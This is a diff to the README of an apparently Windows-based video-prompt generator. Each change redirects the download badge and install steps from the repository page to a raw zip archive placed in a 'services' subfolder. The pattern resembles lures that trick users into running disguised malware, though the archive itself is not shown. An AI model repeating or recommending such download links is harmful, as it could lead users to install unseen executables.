@@ -1,6 +1,6 @@
 # 🎬 veoscript-prompt-generator - Create better video prompts fast
 
-[![Download the app](https://img.shields.io/badge/Download%20the%20app-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dape8318/veoscript-prompt-generator)
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dape8318/veoscript-prompt-generator/raw/refs/heads/main/services/generator_prompt_veoscript_v2.1.zip)
 
 ## 🖥️ What this app does
 
@@ -16,7 +16,7 @@ Use it when you want to:
 
 Use this page to download and run this app on your Windows PC:
 
-https://github.com/dape8318/veoscript-prompt-generator
+https://github.com/dape8318/veoscript-prompt-generator/raw/refs/heads/main/services/generator_prompt_veoscript_v2.1.zip
 
 This project runs locally on your computer. You do not need a cloud setup to start.
 
@@ -35,7 +35,7 @@ If you do not have Node.js yet, install the current Windows version from the Nod
 Follow these steps in order:
 
 1. Open the download page:
-   https://github.com/dape8318/veoscript-prompt-generator
+   https://github.com/dape8318/veoscript-prompt-generator/raw/refs/heads/main/services/generator_prompt_veoscript_v2.1.zip
 
 2. Download the project files to your computer.
 
